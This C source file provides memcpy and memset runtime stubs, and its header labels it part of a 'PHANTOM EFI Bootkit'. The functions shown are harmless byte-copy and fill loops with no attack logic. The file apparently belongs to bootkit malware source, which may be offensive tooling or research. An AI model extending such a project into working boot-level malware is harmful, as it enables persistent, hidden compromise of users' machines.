/*
 * PHANTOM EFI Bootkit - Compiler Runtime Stubs
 *
 * mingw may emit implicit calls to memcpy/memset for struct copies
 * and zero-init. These provide the symbols so linking doesn't fail.
 * Compiled with -fno-builtin to prevent recursive expansion.
 */

#include "efi_defs.h"

void *memcpy(void *dest, const void *src, unsigned long long n)
{
    UINT8 *d = (UINT8 *)dest;
    const UINT8 *s = (const UINT8 *)src;
    while (n--)
        *d++ = *s++;
    return dest;
}

void *memset(void *s, int c, unsigned long long n)
{
    UINT8 *p = (UINT8 *)s;
    while (n--)
        *p++ = (UINT8)c;
    return s;
}
